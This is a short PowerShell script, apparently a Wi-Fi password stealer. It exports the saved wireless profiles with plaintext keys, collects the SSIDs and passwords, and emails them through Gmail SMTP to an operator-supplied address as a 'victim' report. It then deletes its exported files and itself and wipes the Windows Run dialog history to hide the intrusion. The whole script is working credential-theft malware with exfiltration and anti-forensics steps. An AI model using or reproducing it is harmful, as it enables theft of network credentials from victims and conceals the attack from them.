netsh wlan export profile key=clear

echo "Wifi password mailler Coded By " > wifipass.txt
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial

Out-File wifipass.txt -Append -InputObject $a

}


$SMTPServer = 'smtp.gmail.com'


  $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)


  $SMTPInfo.EnableSsl = $true


  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mailadresiniz@gmail.com', 'ŞİFRENİZ')


  $ReportEmail = New-Object System.Net.Mail.MailMessage


  $ReportEmail.From = 'MAİLADRESİNİZ@gmail.com'


  $ReportEmail.To.Add('MAİL ADRESİNİZ@gmail.com')


  $ReportEmail.Subject = 'WIFI Pass Report of ' + $env:UserName


  $ReportEmail.Body = 'Attached is your victim WIFI Passwords'


  $ReportEmail.Attachments.Add('wifipass.txt')


  $SMTPInfo.Send($ReportEmail)

rm *.xml -Force
rm w.txt -Force
rm w.PS1 -Force
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
